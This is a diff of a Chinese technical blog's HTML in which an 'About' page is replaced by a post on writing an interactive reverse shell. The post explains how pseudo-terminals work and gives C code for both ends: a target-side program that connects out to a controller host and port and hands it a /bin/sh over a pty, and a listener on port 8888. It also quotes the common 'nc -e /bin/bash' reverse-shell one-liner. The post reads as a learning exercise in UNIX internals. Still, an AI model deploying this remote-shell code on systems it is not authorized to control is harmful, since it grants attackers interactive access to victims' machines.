@@ -16,19 +16,21 @@
 
 
 
-<title>About - 二进制咸鱼的自我救赎</title>
+<title>写一个可交互的反弹 Shell - 二进制咸鱼的自我救赎</title>
 
 
 <meta name="author" content="chen_null" />
 
 
 
+<meta name="keywords" content="linux" />
 
-<meta property="og:title" content="About" />
-<meta name="twitter:title" content="About" />
+
+<meta property="og:title" content="写一个可交互的反弹 Shell" />
+<meta name="twitter:title" content="写一个可交互的反弹 Shell" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://chenx6.github.io/about/" /><meta property="og:description" content="这是一个介绍页面，但是我不知道该写什么&hellip; 个人介绍 对软件逆向工程感兴趣 联系邮箱：abc82766@gmail.com 使用说明 注意，发在安全客等媒体上的文章没法以 CC BY 许可公开&hellip;" />
-<meta name="twitter:description" content="这是一个介绍页面，但是我不知道该写什么&hellip; 个人介绍 对软件逆向工程感兴趣 联系邮箱：abc82766@gmail.com 使用说明 注意，发在安全客等媒体上的文章没法以 CC BY 许可公开&hellip;" /><meta name="twitter:card" content="summary" />
+<meta property="og:url" content="https://chenx6.github.io/post/rev_pty/" /><meta property="og:description" content="在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 nc -e /bin/bash $控制机IP $控制机端口 弹出一个 Shell，然后再用 python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; 这样来升级成交互式 Shell。这样的话得保证环境里有 nc &#43; python，或者得在被控机上" />
+<meta name="twitter:description" content="在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 nc -e /bin/bash $控制机IP $控制机端口 弹出一个 Shell，然后再用 python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; 这样来升级成交互式 Shell。这样的话得保证环境里有 nc &#43; python，或者得在被控机上" /><meta name="twitter:card" content="summary" /><meta property="article:published_time" content="2022-05-02T19:19:57+08:00" /><meta property="article:modified_time" content="2022-05-02T19:19:57+08:00" />
 
 
 <style>
@@ -94,28 +96,157 @@
 <article>
     
     <h2 class="post-item post-title">
-        <a href="https://chenx6.github.io/about/">About</a>
+        <a href="https://chenx6.github.io/post/rev_pty/">写一个可交互的反弹 Shell</a>
     </h2>
     <div class="post-item post-meta">
-        <span><i class="iconfont icon-today-sharp"></i>&nbsp;0001-01-01</span>
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2022-05-02</span>
 
 
 
-<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;无标签</span>
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/linux">linux</a>&nbsp;</span>
 
     </div>
     
     <div class="post-content markdown-body">
-        <p>这是一个介绍页面，但是我不知道该写什么&hellip;</p>
-<h2 id="个人介绍">个人介绍</h2>
+        <p>在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 <code>nc -e /bin/bash $控制机IP $控制机端口</code> 弹出一个 Shell，然后再用 <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。</p>
+<h2 id="可交互-shell-的原理">“可交互 Shell” 的原理</h2>
+<p>现在常见的“终端模拟器”，例如 KDE 的 Konsole, MACos 上的 iterm，服务器上的 SSH，都是使用 &ldquo;pty&rdquo; 来实现的。而我们反弹的 Shell 则不一样，所以无法交互。</p>
+<p>而 pty 则是模拟终端的设备。平时使用的终端模拟器是和 pty master 进行沟通，而里面的 shell 是和 pty slave 进行沟通，两者通过 pty 进行沟通。</p>
+<pre><code class="language-plaintext">终端模拟器 &lt;=&gt; | pty master | pty | pty slave | &lt;=&gt; shell
+</code></pre>
+<p>所以我们的实现也很简单，通过 socket 将被控端的 master 和控制端连接起来就好了。</p>
+<pre><code class="language-plaintext">终端模拟器 &lt;=&gt; 控制端 &lt;=(socket 通信)=&gt; 被控端 &lt;=&gt; | pty master | pty | pty slave | &lt;=&gt; shell
+</code></pre>
+<h2 id="代码实现">代码实现</h2>
+<p>首先是导入相关文件，&ldquo;pty.h&rdquo; 包含 pty 相关函数的定义，而 &ldquo;select.h&rdquo; 则是用来处理异步通信的。</p>
+<pre><code class="language-c">#include &lt;pty.h&gt;
+#include &lt;sys/select.h&gt;
+#include &lt;unistd.h&gt;
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+#include &quot;util.h&quot;
+</code></pre>
+<p>被控端代码很简单，通过传入的 <code>host</code> 和 <code>port</code> 创建 socket 连接，然后通过 <code>forkpty</code> 创建 pty，在父进程中进行 socket 和子进程中的通信。</p>
+<p>需要注意的是 <code>forkpty</code> 函数，在 FreeBSD 的 <code>man</code> 手册的说明如下</p>
+<pre><code class="language-man">The  forkpty()  function  combines  openpty(),  fork(2),  and  login_tty() to create a new
+process operating in a pseudoterminal.  A file descriptor referring to master side of  the
+pseudoterminal  is  returned  in amaster.  If name is not NULL, the buffer it points to is
+used to return the filename of the slave.  The termp and winp arguments, if not NULL, will
+determine the terminal attributes and window size of the slave side of the pseudoterminal.
+</code></pre>
+<p>简单翻译就是创建一对 pty，并且 fork 出子进程，然后将 master fd 和 pty 连接起来，将子进程的输入和输出和 slave fd 连接起来。这样的话，父进程只要通过 master fd 就可以和处于 pty slave 处的子进程进行沟通。</p>
+<pre><code class="language-c">int main(int argc, char **argv, char **envp) {
+  if (argc &lt; 3) {
+    printf(&quot;Usage: %s [host] [port]\n&quot;, argv[0]);
+    return -1;
+  }
+  int port = atoi(argv[2]);
+  int socket_fd = 0, master_fd = 0;
+  if ((socket_fd = get_socket_connect(argv[1], port)) &lt;= 0) {
+    return -2;
+  }
+  // Use forkpty to handle communication between pty master and socket
+  int pid = forkpty(&amp;master_fd, NULL, NULL, NULL);
+  if (pid &lt; 0) {
+    return -3;
+  } else if (pid != 0) {
+    // Parent
+    copy_loop(master_fd, socket_fd);
+  } else {
+    // Child
+    execve(&quot;/bin/sh&quot;, NULL, NULL);
+    exit(0);
+  }
+  return 0;
+}
+</code></pre>
+<p>下面的代码则是在两个 fd 之间互相复制内容。通过 <code>select</code> 函数判断哪个 fd 可读，然后将可读 fd 里的内容输出到另一个 fd 里。</p>
+<pre><code class="language-c">static int copy_loop(int fd1, int fd2) {
+  plog(&quot;%d, %d&quot;, fd1, fd2);
+  for (;;) {
+    fd_set set;
+    FD_ZERO(&amp;set);
+    FD_SET(fd1, &amp;set);
+    FD_SET(fd2, &amp;set);
+    if (select(max(fd1, fd2) + 1, &amp;set, NULL, NULL, NULL) &lt;= 0) {
+      return -2;
+    }
+    int read_fd = 0, write_fd = 0;
+    if (FD_ISSET(fd1, &amp;set)) {
+      read_fd = fd1;
+      write_fd = fd2;
+    } else if (FD_ISSET(fd2, &amp;set)) {
+      read_fd = fd2;
+      write_fd = fd1;
+    }
+    int read_bytes = copy_data(read_fd, write_fd);
+    if (read_bytes &lt; 0) {
+      return read_bytes;
+    }
+  }
+}
+</code></pre>
+<p>而控制端的代码看起来会比较奇怪。首先是打开了 <code>/proc/self/fd/0</code>，可以看到这是指向了 <code>/dev/pts/1</code>，即打开当前的 pty。</p>
+<pre><code class="language-bash">~/d/chenx6.github.io &gt; ls -la /proc/self/fd
+总用量 0
+dr-x------ 2 chenx chenx  0  5月  2 19:47 .
+dr-xr-xr-x 9 chenx chenx  0  5月  2 19:47 ..
+lrwx------ 1 chenx chenx 64  5月  2 19:47 0 -&gt; /dev/pts/1
+lrwx------ 1 chenx chenx 64  5月  2 19:47 1 -&gt; /dev/pts/1
+lrwx------ 1 chenx chenx 64  5月  2 19:47 2 -&gt; /dev/pts/1
+lr-x------ 1 chenx chenx 64  5月  2 19:47 3 -&gt; /proc/1091/fd
+lr-x------ 1 chenx chenx 64  5月  2 19:47 51 -&gt; anon_inode:inotify
+</code></pre>
+<p>然后是终端的设置。对 <code>c_lflag</code> 本地模式进行设置，设置为不回显，uncanonical mode。然后是对 <code>c_cc</code> 特殊字符设置不处理 ”^C / ^Z / ^\“。</p>
+<p>最后就是创建 socket 连接，复制数据(和被控端类似，区别请见末尾的文件)。当复制结束时则恢复回原本的终端设置。</p>
+<pre><code class="language-c">#include &lt;arpa/inet.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;pty.h&gt;
+#include &lt;sys/select.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;termios.h&gt;
+#include &lt;unistd.h&gt;
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+#include &quot;util.h&quot;
+
+int main() {
+  // PTY
+  int pty_fd = open(&quot;/proc/self/fd/0&quot;, O_RDWR);
+  struct termios terminal, origin_terminal;
+  tcgetattr(pty_fd, &amp;terminal);
+  origin_terminal = terminal;
+  // turn off echo, uncanonical mode
+  terminal.c_lflag &amp;= ~ECHO;
+  terminal.c_lflag &amp;= ~ICANON;
+  // Don't handle ^C / ^Z / ^\
+  terminal.c_cc[VINTR] = 0;
+  terminal.c_cc[VQUIT] = 0;
+  terminal.c_cc[VSUSP] = 0;
+  tcsetattr(pty_fd, TCSANOW, &amp;terminal);
+
+  // Socket
+  int listen_fd = get_socket_listen(&quot;0.0.0.0&quot;, 8888);
+  socklen_t s;
+  struct sockaddr accepted_addr;
+  int accepted_fd = accept(listen_fd, &amp;accepted_addr, &amp;s);
+  copy_loop(accepted_fd);
+  tcsetattr(pty_fd, TCSANOW, &amp;origin_terminal);
+  return 0;
+}
+</code></pre>
+<p>可以看到，很少的代码就能创建一个交互式反弹 Shell，还能复习 UNIX 知识。</p>
+<p>完整代码在这：<a href="https://gist.github.com/chenx6/7a51c3cda5c0055a4df5cee66f762fea" target="_blank">https://gist.github.com/chenx6/7a51c3cda5c0055a4df5cee66f762fea</a></p>
+<h2 id="refs">Refs</h2>
 <ul>
-<li>对软件逆向工程感兴趣</li>
-<li>联系邮箱：abc82766@gmail.com</li>
+<li>基于原本的项目，魔改了下，兼容 Python3 <a href="https://github.com/chenx6/python-pty-shells" target="_blank">https://github.com/chenx6/python-pty-shells</a></li>
+<li><a href="https://segmentfault.com/a/1190000019747315" target="_blank">pseudo-terminal 基础一</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/57518857" target="_blank">linux select函数解析以及事例</a></li>
 </ul>
-<h2 id="使用说明">使用说明</h2>
-<p>注意，发在安全客等媒体上的文章没法以 CC BY 许可公开&hellip;</p>
-<h2 id="本站为-wumaoland-组织的一员">本站为 wumaoland 组织的一员</h2>
-<p>本站很荣幸成为 wumaoland 组织的一员，感谢轮子邪教和没有🐴的三西猴能为鄙人授予这么崇高的荣誉！希望三西猴早日能体验到共产主义铁拳的温暖。</p>
 
     </div>
 </article>
@@ -260,9 +391,9 @@
     <div class="sidebar-item sidebar-toc">
         <h3>目录</h3><nav id="TableOfContents">
   <ul>
-    <li><a href="#个人介绍">个人介绍</a></li>
-    <li><a href="#使用说明">使用说明</a></li>
-    <li><a href="#本站为-wumaoland-组织的一员">本站为 wumaoland 组织的一员</a></li>
+    <li><a href="#可交互-shell-的原理">“可交互 Shell” 的原理</a></li>
+    <li><a href="#代码实现">代码实现</a></li>
+    <li><a href="#refs">Refs</a></li>
   </ul>
 </nav></div>
 </aside>
@@ -385,6 +516,19 @@
             </span>
             
         </div>
+    </div>
+    
+    
+    
+    <div class="sidebar-item sidebar-toc">
+        <h3>目录</h3>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#可交互-shell-的原理">“可交互 Shell” 的原理</a></li>
+    <li><a href="#代码实现">代码实现</a></li>
+    <li><a href="#refs">Refs</a></li>
+  </ul>
+</nav>
     </div>
     
     
